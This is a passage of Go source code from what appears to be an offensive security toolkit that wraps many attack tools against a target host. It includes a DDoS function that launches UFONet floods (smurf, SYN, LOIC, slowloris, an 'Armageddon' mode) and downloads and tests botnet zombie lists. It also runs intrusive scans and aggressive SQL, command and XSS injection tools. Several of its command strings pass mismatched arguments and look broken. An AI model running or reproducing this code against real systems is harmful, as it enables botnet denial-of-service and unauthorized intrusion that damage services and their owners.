                    if strings.Contains(line, "high") || strings.Contains(line, "\"severity\":\"high\"") {
                        highCount++
                    }
                }
                vulnCount += len(lines)
            }
        }
    }

    report += fmt.Sprintf(`
                🎯 VULNERABILITY SUMMARY
Total Vulnerabilities: %-5d
Critical:              %-5d
High:                  %-5d
Medium:                %-5d
Low:                   %-5d
                  📁 OUTPUT DIRECTORY
%s

                   🛠️ TOOLS EXECUTED
• Discovery: subfinder, amass, assetfinder, findomain, shuffledns, dnsx, asnmap, cdncheck
• Scanning: naabu, nmap, httpx, whatweb, aquatone, gowitness
• Crawling: waybackurls, gau, urlfinder, gospider, katana, gobuster, ffuf
• Vulnerability: gitleaks, trufflehog, semgrep, nuclei, dalfox, sqlmap

Total: 26 tools
`, vulnCount, criticalCount, highCount, vulnCount-criticalCount-highCount, 0, ReconDir)

    ioutil.WriteFile(reportFile, []byte(report), 0644)

    fmt.Printf("\n%s📄 %sFinal Report generated: %s%s%s\n", bcolors.Cyan, bcolors.BrightWhite, bcolors.BrightYellow, reportFile, bcolors.Endc)
}

func CombineSu(RHost, ReconDir string) {
    subdomainDir := filepath.Join(ReconDir, "subdomains")

    files := []string{
        filepath.Join(subdomainDir, fmt.Sprintf("subfinder_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("amass_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("assetfinder_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("findomain_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("crt_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("shuffledns_%s.txt", utils.RHost)),
        filepath.Join(subdomainDir, fmt.Sprintf("dnsx_cert_%s.txt", utils.RHost)),
    }

    uniqueSubdomains := make(map[string]struct{})
    
    for _, file := range files {
        if utils.FileExists(file) {
            content, err := ioutil.ReadFile(file)
            if err == nil {
                for _, line := range strings.Split(string(content), "\n") {
                    line = strings.TrimSpace(line)
                    if line != "" && !strings.Contains(line, " ") && !strings.Contains(line, "[") {
                        uniqueSubdomains[line] = struct{}{}
                    }
                }
            }
        }
    }

    outputFile := filepath.Join(subdomainDir, fmt.Sprintf("all_subdomains_%s.txt", utils.RHost))
    subdomains := make([]string, 0, len(uniqueSubdomains))
    for s := range uniqueSubdomains {
        subdomains = append(subdomains, s)
    }
    sort.Strings(subdomains)

    ioutil.WriteFile(outputFile, []byte(strings.Join(subdomains, "\n")), 0644)
}

func SortHttpx(RHost, ReconDir string) {
    httpxDir := filepath.Join(ReconDir, "tech")
    httpxOutput := filepath.Join(httpxDir, fmt.Sprintf("httpx_%s.json", utils.RHost))
    sortedOutput := filepath.Join(httpxDir, fmt.Sprintf("sorted_httpx_%s.txt", utils.RHost))
    
    if !utils.FileExists(httpxOutput) {
        httpxOutput = filepath.Join(httpxDir, fmt.Sprintf("httpx_%s.txt", utils.RHost))
        if !utils.FileExists(httpxOutput) {
            fmt.Printf("%s  ⚠ %sHTTPX output not found, skipping sort ...%s\n", bcolors.Yellow, bcolors.BrightWhite, bcolors.Endc)
            return
        }
    }

    content, err := ioutil.ReadFile(httpxOutput)
    if err != nil {
        return
    }

    var urls []string

    lines := strings.Split(string(content), "\n")
    for _, line := range lines {
        if line == "" {
            continue
        }
        var data map[string]interface{}
        if err := json.Unmarshal([]byte(line), &data); err == nil {
            if url, ok := data["url"].(string); ok {
                url = strings.Replace(url, "https://", "", 1)
                url = strings.Replace(url, "http://", "", 1)
                urls = append(urls, url)
            }
        } else {
            parts := strings.Fields(line)
            if len(parts) > 0 {
                url := parts[0]
                url = strings.Replace(url, "https://", "", 1)
                url = strings.Replace(url, "http://", "", 1)
                urls = append(urls, url)
            }
        }
    }
    
    sort.Strings(urls)
    ioutil.WriteFile(sortedOutput, []byte(strings.Join(urls, "\n")), 0644)
}

func Intrusive(RHost, ReconDir string) {
    fmt.Printf("\n%s[*] %sStarting INTRUSIVE SCANNING PHASE ...%s\n", 
        bcolors.Yellow, bcolors.BrightWhite, bcolors.Endc)
    
    sortedHttpxOutput := filepath.Join(ReconDir, "tech", fmt.Sprintf("sorted_httpx_%s.txt", utils.RHost))
    katanaFinalOutPut := filepath.Join(ReconDir, "assets", fmt.Sprintf("katana_%s.txt", utils.RHost))

    ips, err := net.LookupHost(utils.RHost)
    if err == nil && len(ips) > 0 {
        targetIP := ips[0]

        fmt.Printf("%s  → %sNmap script scan ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("nmap -sV -p 80,443,8080,8443 --script=default,vuln,exploit -oN %s/ports/nmap_intrusive_%s.txt %s", ReconDir, utils.RHost, targetIP)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }
    fmt.Printf("\n%s  → %sDeep directory fuzzing ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gobuster dir -l %s -w %s -x 7z,zip,tar,gz,bz2,sql,bak,backup,old,db,json,xml,conf,config,asp,aspx,php,jsp,txt,html,log,key,pem,crt,csr -t 100 -k -o %s/fuzzing/gobuster_deep_%s.txt", sortedHttpxOutput, "wordlists/directories.txt", ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    if utils.FileExists(katanaFinalOutPut) {
        fmt.Printf("%s  → %sDeep XSS scanning ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("dalfox file --only-poc r --ignore-return 302,404,403 --skip-bav --deep-search %s -o %s/vulnerabilities/dalfox_deep_%s.txt", katanaFinalOutPut, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    fmt.Printf("%s  → %sParameter discovery ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("arjun -l %s -o %s/fuzzing/arjun_%s.json", sortedHttpxOutput, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sSubdomain takeover detection ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("subjack -w %s/subdomains/all_subdomains_%s.txt -a -o %s/vulnerabilities/takeover_%s.txt", ReconDir, utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sCORS misconfiguration check ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("corsy -l %s -o %s/vulnerabilities/cors_%s.json", sortedHttpxOutput, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sOpen redirect detection ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("openredirex -l %s -o %s/vulnerabilities/redirect_%s.txt", sortedHttpxOutput, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sDependency vulnerability check ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nuclei -l %s -t vulnerabilities/ -silent -json -o %s/vulnerabilities/dependencies_%s.json", sortedHttpxOutput, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s✓ %sIntrusive scanning complete!%s\n", bcolors.BrightGreen, bcolors.BrightWhite, bcolors.Endc)
}


func ScanCRT(RHost, ReconDir string) error {
    crtOutput := filepath.Join(ReconDir, fmt.Sprintf("crt_%s.txt", utils.RHost))
    crtURL := fmt.Sprintf("https://crt.sh/?q=%%.%s&output=json", utils.RHost)

    cmd := exec.Command("curl", "-s", crtURL)
    response, err := cmd.Output()
    if err != nil {
        return fmt.Errorf("failed to execute curl command: %v", err)
    }

    var data []map[string]interface{}
    if err := json.Unmarshal(response, &data); err != nil {
        return fmt.Errorf("failed to parse JSON response: %v", err)
    }

    uniqueSubdomains := make(map[string]struct{})
    for _, entry := range data {
        if nameValue, ok := entry["name_value"].(string); ok && nameValue != "" {
            nameValue = strings.Replace(nameValue, "*.", "", -1)
            for _, domain := range strings.Split(nameValue, "\n") {
                domain = strings.TrimSpace(domain)
                if domain != "" {
                    uniqueSubdomains[domain] = struct{}{}
                }
            }
        }
    }

    subdomains := make([]string, 0, len(uniqueSubdomains))
    for s := range uniqueSubdomains {
        subdomains = append(subdomains, s)
    }
    sort.Strings(subdomains)

    return ioutil.WriteFile(crtOutput, []byte(strings.Join(subdomains, "\n")+"\n"), 0644)
}

func writeUniqueSubdomainsToFile(filename string, uniqueSubdomains map[string]struct{}) {
    subdomains := make([]string, 0, len(uniqueSubdomains))
    for subdomain := range uniqueSubdomains {
        subdomains = append(subdomains, subdomain)
    }
    sort.Strings(subdomains)

    err := ioutil.WriteFile(filename, []byte(strings.Join(subdomains, "\n")+"\n"), 0644)
    utils.CheckErr(err)
}

func DDosAttack(RHost, DDosMode string) {
    fmt.Sprintf("\n%s[*] %sSending DDos packets ...%s", bcolors.Green, bcolors.Endc, bcolors.Endc)
    switch strings.ToLower(utils.DDosMode) {
    case "1", "light":
        fmt.Printf("\n%s[*] %sLaunched Socking_waves(instant-knockout!) ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -r '100' --threads '100' --nuke '10000' -a '%s'", utils.WeBountyTools, utils.VenvPython, utils.RHost)
        return
    case "2", "simple":
        fmt.Printf("\n%s[*] %sLaunched xcom-1(only DDoS) ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -r '100' --threads '100' --spray '1000' --smurf '1000' --tachyon '1000' --monlist '1000' --fraggle '1000' --sniper '1000' -a '%s'", utils.WeBountyTools, utils.VenvPython, utils.RHost)
        return
    case "3", "hard":
        fmt.Printf("\n%s[*] %sLaunched Palantir 3.14 ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -r '100' --threads '100' --loic '1000' --loris '1000' -a '%s'", utils.WeBountyTools, utils.VenvPython, utils.RHost)
        return
    case "4", "harder":
        fmt.Printf("\n%s[*] %sLaunched xcom-2(only DoS) ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -r '100' --threads '100' --loic '1000' --loris '1000' --ufosyn '1000' --xmas '1000' --nuke '1000' --ufoack '1000' --uforst '1000' --droper '1000' --overlap '1000' --pinger '1000' --ufoudp '1000' -a '%s'", utils.WeBountyTools, utils.VenvPython, utils.RHost)
        return
    case "5", "update":
        fmt.Printf("\n%s[*] %sDownloading list of bots from C.S ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet --download-zombies", utils.WeBountyTools, utils.VenvPython)
        return
    case "6", "test":
        fmt.Printf("\n%s[*] %sTesting If all bots are alive & ready to launch ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -t botnet/zombies.txt", utils.WeBountyTools, utils.VenvPython)
        return
    case "7", "grider":
        fmt.Printf("\n%s[*] %sStarted Grider ufonet --grider ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet --grider", utils.WeBountyTools, utils.VenvPython)
        return
    case "8", "gui":
        fmt.Printf("\n%s[*] %sLaunched ufonet UI on http://localhost:9999 ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet --gui", utils.WeBountyTools, utils.VenvPython)
        return
    case "9", "intense":
        fmt.Printf("\n%s[*] %sLaunched Armageddon! with All! ...", bcolors.Green, bcolors.Endc)
        subprocess.Run("cd %s/ufonet/; %s ufonet -r '100' --threads '100' --loic '1000' --loris '1000' --ufosyn '1000' --spray '1000' --smurf '1000' --xmas '1000' --nuke '1000' --tachyon '1000' --monlist '1000' --fraggle '1000' --sniper '1000' --ufoack '1000' --uforst '1000' --droper '1000' --overlap '1000' --pinger '1000' --ufoudp '1000' -a '%s'", utils.WeBountyTools, utils.VenvPython, utils.RHost)
        return
    default:
        fmt.Printf("\n%s[!] %sError: Invalid DDOSMODE. %s'%s' %sTry %s'show ddosmode' %stype", bcolors.BrightRed, bcolors.Endc, bcolors.Yellow, bcolors.Endc, bcolors.Green, utils.DDosMode, bcolors.Endc)
    }
}

//Intense bug bounty hunt
func FindIPs(RHost, ResolversFile, ReconDir string) {
    fmt.Printf("\n%s[*] %sFinding IPs for subdomains ...%s\n", bcolors.Green, bcolors.Endc, bcolors.Endc)

    subdomainsOutput := filepath.Join(ReconDir, fmt.Sprintf("subdomains_%s.txt", utils.RHost))
    ipsOutput := filepath.Join(ReconDir, fmt.Sprintf("%s.ips.txt", utils.RHost))

    subprocess.Run("massdns -r %s -t A -o S -w %s %s", ResolversFile, ipsOutput, subdomainsOutput)
}

func Sublist3r(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/sublist3r/; %s sublist3r.py -v -d %s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Ashock1(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/ashok/; %s ashok.py --headers %s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func OneForAll(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/oneforall/; %s oneforall.py --alive True --brute True --port medium --dns True --req True --takeover True --show True run --target %s ", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func SeekOlver(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/seekolver/; %s seekolver.py -v -r -k -cn -p 80 443 -te %s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func ParamSpider(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming urls mine ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/paramspider/; %s paramspider.py -s -d %s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func SslScan(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming ssl scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("sslscan --show-certificate --show-sigs --tlsall --verbose %s", utils.WeBountyTools, utils.RHost)
}

func Gobuster(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming dir recon ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("gobuster dir vhost --debug --no-error --random-agent -w %s -e -u %s", utils.WordsList, utils.WeBountyTools, utils.RHost)
}

func Nuclei(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("nuclei -u %s", utils.WeBountyTools, utils.RHost)
}

func Nikto(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("nikto -ask no -Cgidirs all -Display 3 -host %s", utils.WeBountyTools, utils.RHost)
}

func Bbot(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming 3rd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m gowitness nuclei --allow-deadly -t %s", utils.RHost)
}

func Uniscan(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming 4th vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("uniscan -qweds -u %s", utils.WeBountyTools, utils.RHost)
}

func SqlmapAuto(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s", utils.RHost)
}

func SqlmapMan() {
    fmt.Printf("\n%s[*] %sPerforming man sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard")
}

func CommixAuto(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 -u %s", utils.RHost)
}

func CommixMan() {
    fmt.Printf("\n%s[*] %sPerforming man command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 --wizard")
}

func KatanaAuto(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("katana -jc -kf all -c 5 -d 3 %s | httpx -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav", utils.RHost)
}

func XsserAuto(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("xsser -c 100 --Cl -u %s", utils.RHost)
}

func XsserMan() {
    fmt.Printf("\n%s[*] %sPerforming man xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("xsser -u --wizard")
}

func NetTacker1(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -m port_scan -t 100 -i %s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker2(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming domain scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m subdomain_scan", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker3(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming admin finder scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m scan", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker4(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming info gathering ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m information_gathering -s", utils.WeBountyTools, utils.VenvPython, utils.RHost)
    fmt.Printf("%s", "\n")
}

func NetTacker5(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m server_version_vuln", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker6(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming CVE scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m cve", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker7(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s -m high_severity", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker8(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming intrusive scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py -i %s --profile all/results.txt", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func NetTacker9() {
    fmt.Printf("\n%s[*] %sLaunched WebUI key: africana ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/nettacker/; %s nettacker.py --start-api --api-access-key africana", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r1() {
    fmt.Printf("\n%s[*] %sInstalling tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; bash install-all.sh", utils.WeBountyTools, utils.RHost)
}

func Jok3r2() {
    fmt.Printf("\n%s[*] %sUpdating tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py toolbox --update-all --auto", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r3() {
    fmt.Printf("\n%s[*] %sShowing tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py toolbox --show-all", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r4() {
    fmt.Printf("\n%s[*] %sShowing supported products ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py info --services", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r5(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming avery fast-scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py attack -t %s --profile fast-scan --fast", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r6(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming security checks on " + bcolors.BrightRed + "\nTarget: " + bcolors.Yellow + "%s \n" + bcolors.Endc, utils.RHost)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py attack -t %s --profile red-team --fast", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r7(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py attack -t %s --profile red-team --fast", utils.WeBountyTools, utils.VenvPython, utils.RHost)
}

func Jok3r8() {
    fmt.Printf("\n%s[*] %sShowing results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; xhost +; %s jok3r.py db creds vulns mission hosts products services report quit; xhost -", utils.WeBountyTools, utils.VenvPython)
}

func Jok3r9() {
    fmt.Printf("\n%s[*] %sCleaning results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("cd %s/jok3r/; %s jok3r.py db 'mission -d default'", utils.WeBountyTools, utils.VenvPython)
}

func Osmedeus1() {
    fmt.Printf("\n%s[*] %sUpdating Osmedeus & Runing diagnostics to checks ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean")
}

func Osmedeus2(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming simple scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus --nv scan -t %s", utils.RHost)
}

func Osmedeus3(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming dir & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus --nv scan -f vuln-and-dirb -t %s", utils.RHost)
}

func Osmedeus4(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming bulk scan on %s ", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Run("osmedeus scan -f vuln-and-dirb -t %s", utils.RHost)
}

func Osmedeus5(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming cloud scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s", utils.RHost)
}

func Osmedeus6(RHost string) {
    fmt.Printf("\n%s[*] %sPerforming secret & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s", utils.RHost)
}

func Osmedeus7(RHost string) {
    fmt.Printf("\n%s[*] %sUpdating db before running vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus scan --update-vuln -t %s", utils.RHost)
}

func Osmedeus8(Port string) {
    fmt.Printf("\n%s[*] %sStarted Osmedeusweb UI http://127.0.0.1:%s%s", bcolors.Green, bcolors.Endc, Port, bcolors.Endc)
    subprocess.Run("osmedeus server --port %s", Port)
}

func Osmedeus9() {
    fmt.Printf("\n%s[*] %sShowing scanned osmedeus report list ...", bcolors.Green, bcolors.Endc)
    subprocess.Run("osmedeus report list")
}


